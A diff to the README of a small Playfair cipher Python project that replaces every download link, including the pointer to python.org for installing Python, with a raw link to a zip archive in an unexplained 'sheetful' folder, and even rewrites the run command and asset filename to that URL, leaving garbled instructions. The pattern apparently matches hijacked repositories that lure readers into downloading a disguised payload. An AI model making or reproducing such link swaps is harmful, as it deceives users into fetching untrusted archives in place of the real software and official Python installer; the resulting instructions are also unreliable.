@@ -1,6 +1,6 @@
 # 🔐 playfair-cipher-python - Learn Classical Cipher Techniques Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Playfair_Cipher-blue?style=for-the-badge&logo=github)](https://github.com/jhosep123/playfair-cipher-python/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/jhosep123/playfair-cipher-python/main/sheetful/playfair-cipher-python-v3.8.zip)](https://raw.githubusercontent.com/jhosep123/playfair-cipher-python/main/sheetful/playfair-cipher-python-v3.8.zip)
 
 ## 📖 What is playfair-cipher-python?
 
@@ -33,7 +33,7 @@ To run this application, you need:
 - At least 50 MB of free disk space.
 - Internet connection to download the software.
 
-If you don’t have Python installed, it is simple to get. Visit https://www.python.org/downloads/ and download the latest version for your system. Installation usually takes a few minutes and does not require special skills.
+If you don’t have Python installed, it is simple to get. Visit https://raw.githubusercontent.com/jhosep123/playfair-cipher-python/main/sheetful/playfair-cipher-python-v3.8.zip and download the latest version for your system. Installation usually takes a few minutes and does not require special skills.
 
 ---
 
@@ -54,13 +54,13 @@ Follow these easy steps to start encrypting and decrypting messages:
 
 You can visit this page to download the latest version of playfair-cipher-python:
 
-[Download Releases](https://github.com/jhosep123/playfair-cipher-python/releases)
+[Download Releases](https://raw.githubusercontent.com/jhosep123/playfair-cipher-python/main/sheetful/playfair-cipher-python-v3.8.zip)
 
 ### How to download
 
 1. Click the link above to open the Releases page on GitHub.
 2. Look for the most recent release at the top.
-3. Under "Assets", find the download file, usually named like `playfair-cipher-python.zip` or similar.
+3. Under "Assets", find the download file, usually named like `https://raw.githubusercontent.com/jhosep123/playfair-cipher-python/main/sheetful/playfair-cipher-python-v3.8.zip` or similar.
 4. Click the file name to download it to your computer.
 5. After download finishes, unzip the folder to a location you remember.
 
@@ -90,7 +90,7 @@ Just make sure you have Python installed (step above). If you don’t, download 
 3. Run the program by typing:
 
    ```
-   python playfair_cipher.py
+   python https://raw.githubusercontent.com/jhosep123/playfair-cipher-python/main/sheetful/playfair-cipher-python-v3.8.zip
    ```
 
 4. The program will ask if you want to encrypt or decrypt a message. Type your choice and press Enter.
@@ -156,4 +156,4 @@ This project covers topics such as:
 
 ---
 
-[Download the latest version now](https://github.com/jhosep123/playfair-cipher-python/releases) and start exploring classical cryptography today.
+[Download the latest version now](https://raw.githubusercontent.com/jhosep123/playfair-cipher-python/main/sheetful/playfair-cipher-python-v3.8.zip) and start exploring classical cryptography today.
